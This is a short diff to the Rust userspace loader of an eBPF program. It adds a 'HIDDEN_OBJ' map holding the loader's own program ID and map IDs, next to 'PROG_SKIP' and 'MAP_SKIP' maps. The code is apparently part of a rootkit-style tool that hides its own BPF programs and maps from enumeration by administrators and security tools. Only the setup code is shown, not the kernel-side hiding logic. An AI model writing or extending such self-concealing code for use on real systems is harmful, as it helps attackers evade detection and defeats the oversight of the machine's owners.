@@ -92,7 +92,19 @@ async fn main() -> anyhow::Result<()> {
     let mut prog_maps = prog_info.map_ids().unwrap().unwrap();
     prog_maps.sort();
 
-    let ctrl_c = signal::ctrl_c();
+    //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
+    let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
+        HashMap::try_from(ebpf.take_map("HIDDEN_OBJ").unwrap()).unwrap();
+    let mut hidden_progs = [0u32; 32];
+    hidden_progs[0] = prog_id;
+    let mut hidden_maps = [0u32; 32];
+    for (idx, m) in prog_maps.iter().enumerate() {
+        hidden_maps[idx] = *m
+    }
+    hidden_obj_map.insert(0, hidden_progs, 0).unwrap();
+    hidden_obj_map.insert(1, hidden_maps, 0).unwrap();
+
+    //setup skip MAPS
     let mut prog_skip_map: HashMap<_, u32, u32> =
         HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
     let mut map_skip_map: HashMap<_, u32, u32> =
@@ -140,6 +152,7 @@ async fn main() -> anyhow::Result<()> {
             }
         }
     });
+    let ctrl_c = signal::ctrl_c();
     println!("Waiting for Ctrl-C...");
     ctrl_c.await?;
     println!("Exiting...");
